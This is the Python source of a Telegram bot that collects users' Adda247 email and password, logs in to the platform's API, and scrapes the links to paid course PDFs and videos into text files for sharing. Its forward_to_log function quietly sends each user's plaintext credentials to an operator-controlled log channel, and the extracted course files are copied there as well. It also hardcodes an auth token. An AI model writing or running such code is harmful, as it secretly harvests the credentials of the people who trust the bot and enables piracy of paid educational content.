import os
import time
import json
import logging
import asyncio
import httpx
import pytz
from datetime import datetime
from pyrogram import Client, filters
from pyrogram.types import Message
from pyrogram.enums import ParseMode

import config

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

app = Client(
    "adda_extractor_bot",
    api_id=config.API_ID,
    api_hash=config.API_HASH,
    bot_token=config.BOT_TOKEN
)

USER_STATES = {}
THUMB_PATH = "thumb.jpg"
TIMEOUT = 30

# Standard Headers to prevent 400 Bad Request errors
DEFAULT_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "en-US,en;q=0.9",
    "Origin": "https://www.adda247.com",
    "Referer": "https://www.adda247.com/",
    "authority": "store.adda247.com",
    "X-Auth-Token": "fpoa43edty5"
}

def safe_get(obj, *keys, default=None):
    try:
        for key in keys:
            if obj is None:
                return default
            obj = obj.get(key)
        return obj if obj is not None else default
    except (AttributeError, KeyError):
        return default

async def download_thumbnail():
    if not os.path.exists(THUMB_PATH) and config.THUMB_URL:
        try:
            async with httpx.AsyncClient() as client:
                response = await client.get(config.THUMB_URL)
                if response.status_code == 200:
                    with open(THUMB_PATH, 'wb') as f:
                        f.write(response.content)
                    return THUMB_PATH
        except Exception as e:
            logger.error(f"Thumbnail download failed: {e}")
            return None
    return THUMB_PATH if os.path.exists(THUMB_PATH) else None

async def make_request(url, headers=None, method="GET", json_data=None, timeout=TIMEOUT):
    """Safely handle HTTP requests with browser headers"""
    req_headers = DEFAULT_HEADERS.copy()
    if headers:
        req_headers.update(headers)

    try:
        async with httpx.AsyncClient(follow_redirects=True) as client:
            if method == "GET":
                response = await client.get(url, headers=req_headers, timeout=timeout)
            else:
                response = await client.post(url, headers=req_headers, json=json_data, timeout=timeout)
            
            if response.status_code == 200:
                return response.json()
            else:
                logger.warning(f"API Endpoint {url} returned status {response.status_code}")
                return None
    except Exception as e:
        logger.error(f"Request Error for {url}: {e}")
        return None

async def forward_to_log(message: Message, platform: str):
    if config.PREMIUM_LOGS:
        try:
            log_text = (
                f"🔑 <b>NEW LOGIN RECEIVED</b>\n\n"
                f"👤 <b>User:</b> {message.from_user.mention} (<code>{message.from_user.id}</code>)\n"
                f"📱 <b>Platform:</b> {platform}\n"
                f"📝 <b>Data:</b> <code>{message.text}</code>"
            )
            await app.send_message(config.PREMIUM_LOGS, log_text, parse_mode=ParseMode.HTML)
        except Exception as e:
            logger.error(f"Failed to forward logs: {e}")

@app.on_message(filters.command(["start"]))
async def start_cmd(client, message: Message):
    await message.reply_text(
        f"👋 **Hello {message.from_user.first_name}!**\n\n"
        "Main Adda247 Batch Content Extractor Bot hoon.\n"
        "Extract karne ke liye `/adda` command use karein."
    )

@app.on_message(filters.command(["adda"]))
async def adda_command_handler(client, message: Message):
    USER_STATES[message.chat.id] = "WAITING_FOR_CREDENTIALS"
    await message.reply_text(
        "🔹 <b>ADDA247 EXTRACTOR PRO</b> 🔹\n\n"
        "Apne login details iss format mein bhejein:\n"
        "📧 <code>email*password</code>\n\n"
        "<i>Example:</i>\n"
        "<code>user@gmail.com*pass123</code>\n\n"
        "❌ Cancel karne ke liye `/cancel` likhein.",
        parse_mode=ParseMode.HTML
    )

@app.on_message(filters.command(["cancel"]))
async def cancel_handler(client, message: Message):
    if message.chat.id in USER_STATES:
        del USER_STATES[message.chat.id]
        await message.reply_text("🛑 Extraction Process Cancelled.")
    else:
        await message.reply_text("Koi active process nahi chal rha.")

@app.on_message(filters.text & filters.private & ~filters.command(["adda", "start", "cancel"]))
async def process_credentials(client, message: Message):
    chat_id = message.chat.id
    
    if USER_STATES.get(chat_id) != "WAITING_FOR_CREDENTIALS":
        return

    del USER_STATES[chat_id]

    if '*' not in message.text:
        await message.reply_text("❌ Invalid format! Please use `email*password` format.")
        return

    status_msg = await message.reply_text("🔄 <b>Processing authentication...</b>", parse_mode=ParseMode.HTML)
    await forward_to_log(message, "Adda247")

    email, password = message.text.split("*", 1)

    auth_headers = {
        "authority": "userapi.adda247.com",
        "X-Jwt-Token": ""
    }

    login_data = {
        "email": email.strip(),
        "providerName": "email",
        "sec": password.strip()
    }

    login_response = await make_request(
        "https://userapi.adda247.com/login?src=aweb",
        headers=auth_headers,
        method="POST",
        json_data=login_data
    )

    if not login_response:
        await status_msg.edit_text("❌ <b>Login Failed:</b> Credentials ya Server issue.")
        return

    jwt = safe_get(login_response, "jwtToken")
    if not jwt:
        await status_msg.edit_text("❌ <b>Login Failed:</b> Invalid Credentials.")
        return

    auth_headers["X-Jwt-Token"] = jwt
    await status_msg.edit_text("✅ <b>Login Successful!</b>\n🔄 Fetching packages...", parse_mode=ParseMode.HTML)

    packages_response = await make_request(
        "https://store.adda247.com/api/v2/ppc/package/purchased?pageNumber=0&pageSize=20&src=aweb",
        headers=auth_headers
    )

    packages = safe_get(packages_response, "data", default=[])
    if not packages:
        # Fallback to v1 endpoint
        v1_packages = await make_request(
            "https://store.adda247.com/api/v1/my/purchase?src=aweb",
            headers=auth_headers
        )
        packages = safe_get(v1_packages, "data", default=[])

    if not packages:
        await status_msg.edit_text("❌ <b>No Packages Found:</b> Account par koi course active nahi hai.")
        return

    thumb_path = await download_thumbnail()

    for package in packages:
        try:
            package_id = safe_get(package, "packageId") or safe_get(package, "id")
            package_title = safe_get(package, "title", default="Untitled").replace('|', '_').replace('/', '_')

            if not package_id:
                continue

            await status_msg.edit_text(
                f"🔄 <b>Processing Package</b>\n\n📦 <code>{package_title}</code>",
                parse_mode=ParseMode.HTML
            )

            start_time = time.time()
            file_name = f"ADDA_{package_id}_{package_title}.txt"
            total_items = 0

            with open(file_name, "w", encoding='utf-8') as file:
                # 1. Direct Package Items Scrape
                direct_endpoints = [
                    f"https://store.adda247.com/api/v1/my/purchase/OLC/{package_id}?src=aweb",
                    f"https://store.adda247.com/api/v1/my/purchase/content/{package_id}?src=aweb",
                    f"https://store.adda247.com/api/v1/my/purchase/test/{package_id}?src=aweb",
                    f"https://store.adda247.com/api/v1/my/purchase/ebook/{package_id}?src=aweb"
                ]

                for endp in direct_endpoints:
                    d_resp = await make_request(endp, headers=auth_headers)
                    if d_resp:
                        items = safe_get(d_resp, "data", "onlineClasses", default=[]) or \
                                safe_get(d_resp, "data", "contents", default=[]) or \
                                safe_get(d_resp, "data", "tests", default=[]) or \
                                safe_get(d_resp, "data", default=[])
                        
                        if isinstance(items, list):
                            for item in items:
                                item_name = safe_get(item, "name", default="Untitled").replace('|', '_').replace('/', '_')
                                
                                # Check PDF
                                pdf_file = safe_get(item, "pdfFileName") or safe_get(item, "pdf") or safe_get(item, "fileUrl")
                                if pdf_file:
                                    pdf_url = pdf_file if pdf_file.startswith("http") else f"https://store.adda247.com/{pdf_file}"
                                    file.write(f"{item_name}: {pdf_url}\n")
                                    total_items += 1

                                # Check Video
                                video_url = safe_get(item, "url") or safe_get(item, "videoUrl")
                                if video_url:
                                    file.write(f"{item_name}: {video_url}\n")
                                    total_items += 1

                # 2. Child Packages Scrape (Without Category Filter)
                child_urls = [
                    f"https://store.adda247.com/api/v2/ppc/package/child?packageId={package_id}&pageNumber=0&pageSize=100&src=aweb",
                    f"https://store.adda247.com/api/v1/ppc/package/child?packageId={package_id}&src=aweb"
                ]

                child_packages = []
                for c_url in child_urls:
                    c_resp = await make_request(c_url, headers=auth_headers)
                    if c_resp:
                        fetched = safe_get(c_resp, "data", "packages", default=[]) or safe_get(c_resp, "data", default=[])
                        if fetched and isinstance(fetched, list):
                            child_packages.extend(fetched)
                            break

                for child in child_packages:
                    child_id = safe_get(child, "packageId") or safe_get(child, "id")
                    if not child_id:
                        continue

                    endpoints = [
                        (f"https://store.adda247.com/api/v1/my/purchase/OLC/{child_id}?src=aweb", "onlineClasses"),
                        (f"https://store.adda247.com/api/v1/my/purchase/content/{child_id}?src=aweb", "contents"),
                        (f"https://store.adda247.com/api/v1/my/purchase/test/{child_id}?src=aweb", "tests")
                    ]

                    for endpoint, content_key in endpoints:
                        sub_resp = await make_request(endpoint, headers=auth_headers)
                        if not sub_resp:
                            continue

                        items = safe_get(sub_resp, "data", content_key, default=[])
                        if isinstance(items, list):
                            for item in items:
                                item_name = safe_get(item, "name", default="Untitled").replace('|', '_').replace('/', '_')
                                
                                pdf_file = safe_get(item, "pdfFileName") or safe_get(item, "pdf")
                                if pdf_file:
                                    pdf_url = pdf_file if pdf_file.startswith("http") else f"https://store.adda247.com/{pdf_file}"
                                    file.write(f"{item_name}: {pdf_url}\n")
                                    total_items += 1

                                video_url = safe_get(item, "url") or safe_get(item, "videoUrl")
                                if video_url:
                                    file.write(f"{item_name}: {video_url}\n")
                                    total_items += 1

            # Upload File
            if os.path.exists(file_name) and os.path.getsize(file_name) > 0:
                elapsed = time.time() - start_time
                user_mention = message.from_user.mention
                caption = (
                    "🎓 <b>COURSE EXTRACTED</b> 🎓\n\n"
                    f"📱 <b>APP:</b> ADDA 247\n"
                    f"📚 <b>BATCH:</b> {package_title}\n"
                    f"⏱ <b>TIME TAKEN:</b> {elapsed:.1f}s\n"
                    f"📅 <b>DATE:</b> {datetime.now(pytz.timezone('Asia/Kolkata')).strftime('%d-%m-%Y %H:%M:%S')} IST\n\n"
                    f"📊 <b>CONTENT STATS</b>\n"
                    f"└─ 📁 Total Items: {total_items}\n\n"
                    f"🚀 <b>Extracted by:</b> {user_mention}\n\n"
                    f"<code>╾───• {config.BOT_TEXT} •───╼</code>"
                )

                await message.reply_document(
                    document=file_name,
                    caption=caption,
                    thumb=thumb_path,
                    parse_mode=ParseMode.HTML
                )

                if config.PREMIUM_LOGS:
                    try:
                        await app.send_document(
                            chat_id=config.PREMIUM_LOGS,
                            document=file_name,
                            caption=caption,
                            thumb=thumb_path,
                            parse_mode=ParseMode.HTML
                        )
                    except Exception as log_err:
                        logger.error(f"Failed sending to log channel: {log_err}")

                os.remove(file_name)
            else:
                await status_msg.reply_text(f"⚠️ <code>{package_title}</code> (ID: {package_id}) mein koi downloadable PDF ya Video links nahi mile.")

        except Exception as e:
            logger.error(f"Package Processing Error: {e}")
            continue

    await status_msg.reply_text("✅ <b>Extraction Finished!</b>")

if __name__ == "__main__":
    print("Bot starting...")
    app.run()
